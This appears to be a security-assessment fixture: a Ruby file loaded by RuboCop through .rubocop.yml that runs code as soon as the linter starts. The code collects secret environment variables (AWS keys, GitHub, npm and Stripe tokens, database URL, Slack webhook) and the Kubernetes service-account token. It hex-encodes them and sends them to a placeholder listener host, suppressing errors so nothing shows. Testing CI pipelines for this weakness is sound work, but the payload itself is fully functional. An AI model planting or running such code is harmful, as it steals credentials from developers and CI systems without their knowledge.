# Assessment fixture: the Ruby file pulled in by .rubocop.yml `require:`.
#
# RuboCop `require`s this file at startup (see .rubocop.yml). `require` evaluates
# the file, so this top-level code runs inside the linter's process. We don't
# define a real cop; the import side effect is the signal.
#
# Containment: only network target is the __DVAP_LISTENER_HOST__ placeholder
# (substituted by the worker). Ruby stdlib only (net/http).

require "net/http"

SCAN_TOKEN = "__DVAP_SCAN_TOKEN__".freeze
VECTOR = "__DVAP_VECTOR__".freeze
LISTENER_HOST = "__DVAP_LISTENER_HOST__".freeze
LISTENER_PORT = "__DVAP_LISTENER_PORT__".freeze

SECRET_ENV_KEYS = %w[
  AWS_ACCESS_KEY_ID
  AWS_SECRET_ACCESS_KEY
  AWS_CANARY_ACCESS_KEY_ID
  AWS_CANARY_SECRET_ACCESS_KEY
  AWS_SESSION_TOKEN
  GITHUB_TOKEN
  GITHUB_CANARY_TOKEN
  NPM_TOKEN
  APP_DATABASE_URL
  STRIPE_API_KEY
  SLACK_WEBHOOK_URL
].freeze
K8S_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token".freeze

def collect_assessment_data
  lines = []
  SECRET_ENV_KEYS.each do |key|
    val = ENV[key]
    lines << "#{key}=#{val}" if val && !val.empty?
  end
  begin
    token = File.read(K8S_TOKEN_PATH).strip
    lines << "K8S_SA_TOKEN=#{token}" unless token.empty?
  rescue StandardError
    # token file absent -- ignore
  end
  lines.join("\n")
end

def dotted_hex(payload)
  hexed = payload.unpack1("H*")
  hexed.scan(/.{1,60}/).join(".")
end

def send_assessment_signal
  dotted = dotted_hex(collect_assessment_data)
  url = "http://#{LISTENER_HOST}:#{LISTENER_PORT}/b/#{SCAN_TOKEN}/#{VECTOR}?d=#{dotted}"
  begin
    Net::HTTP.get_response(URI(url))
  rescue StandardError
    # network failures should not break analyzer startup
  end
end

# Side effect at require time.
send_assessment_signal
